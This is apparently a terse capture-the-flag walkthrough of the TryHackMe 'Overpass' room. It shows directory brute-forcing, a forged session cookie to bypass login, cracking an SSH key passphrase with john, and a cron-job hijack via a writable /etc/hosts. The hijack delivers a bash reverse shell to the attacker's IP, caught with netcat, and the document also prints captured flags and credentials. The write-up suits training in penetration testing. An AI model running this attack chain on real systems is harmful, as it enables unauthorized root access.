```
***gobuster***
gobuster dir --url http://10.10.101.139 --wordlist /usr/share/wordlists/dirb/common.txt (found path /admin)
***login.js***
firefox debugger -> login.js (statusorCookie found so create a new one cookie)
***creating cookie***
Name: SessionToken, Value: statusorCookie (enter admin with the cookie)
***copy rsa key***
nano key , chmod 600 key , ssh protected (/usr/share/john/ssh2john.py key > hashes.txt)
***hash key***
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
james13          (key)     
1g 0:00:00:00 DONE (2022-07-28 12:54) 25.00g/s 334400p/s 334400c/s 334400C/s pink25..honolulu
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
***login ssh***
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh -i key james@10.10.101.139
The authenticity of host '10.10.101.139 (10.10.101.139)' can't be established.
ED25519 key fingerprint is SHA256:FhrAF0Rj+EFV1XGZSYeJWf5nYG0wSWkkEGSO5b+oSHk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.101.139' (ED25519) to the list of known hosts.
Enter passphrase for key 'key': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-108-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jul 28 16:55:59 UTC 2022

  System load:  0.0                Processes:           88
  Usage of /:   22.3% of 18.57GB   Users logged in:     0
  Memory usage: 12%                IP address for eth0: 10.10.101.139
  Swap usage:   0%


47 packages can be updated.
0 updates are security updates.


Last login: Sat Jun 27 04:45:40 2020 from 192.168.170.1
james@overpass-prod:~$ 
james@overpass-prod:~$ ls
todo.txt  user.txt
james@overpass-prod:~$ cat user.txt 
thm{65c1aaf000506e56996822c6281e6bf7}
james@overpass-prod:~$ cat .overpass 
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
***download source code***
is written in Go is it appears that the password manager is simply using ROT47 to encrypt the password:
***decrypt with cyberchef***
[{"name":"System","pass":"saydrawnlyingpicture"}]
***using linpeas.sh***
download from github https://github.com/carlospolop/PEASS-ng/releases/tag/20220724
chmod +x linpeas.sh
./linpeas.sh (will found priv esc methods)
***http.server (to pass linpeas.sh)***
└─$ sudo python3 -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
in james wget 
james@overpass-prod:~$ wget 10.18.1.77/linpeas.sh
--2022-07-28 17:20:03--  http://10.18.1.77/linpeas.sh
Connecting to 10.18.1.77:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 777018 (759K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh            100%[======================>] 758.81K   153KB/s    in 5.1s    

2022-07-28 17:20:10 (150 KB/s) - ‘linpeas.sh’ saved [777018/777018]
chmod +x linpeas.sh
./linpeas.sh
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                                       
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files    
/dev/mqueue                                                                          
/dev/shm
/etc/hosts
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
james@overpass-prod:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts

his means the /etc/hosts entries could be modified to point overpass.htm at the local Kali machine and make the cron job execute arbitrary Bash scripts as root.

Creating a Bash script with a simple reverse shell that will connect back to the Kali host:
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
***replacing /etc/hosts***
overpass.thm with 10.18.1.77
127.0.0.1 localhost
127.0.1.1 overpass-prod
10.18.1.77 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
***recreate crontab***
mkdir -p donwloads/src/
***create buildscript.sh***
#!!/bin/bash
bash -i >& /dev/tcp/10.18.1.77/443 0>&1
***copy buildscript.sh***
cp buildscript.sh downloads/src/  
***with http.server (python)y netcat de escucha***
The next step is to set up a Netcat listener, which will catch the reverse shell when it is executed by the victim host, using the following flags:

    -l to listen for incoming connections
    -v for verbose output
    -n to skip the DNS lookup
    -p to specify the port to listen on
***root***
┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.18.1.77] from (UNKNOWN) [10.10.101.139] 36376
bash: cannot set terminal process group (16578): Inappropriate ioctl for device
bash: no job control in this shell
root@overpass-prod:~# ls
ls
buildStatus
builds
go
root.txt
src
root@overpass-prod:~# cat root.txt
cat root.txt
thm{7f336f8c359dbac18d54fdd64ea753bb}

```

[[Overpassed2_pcap]]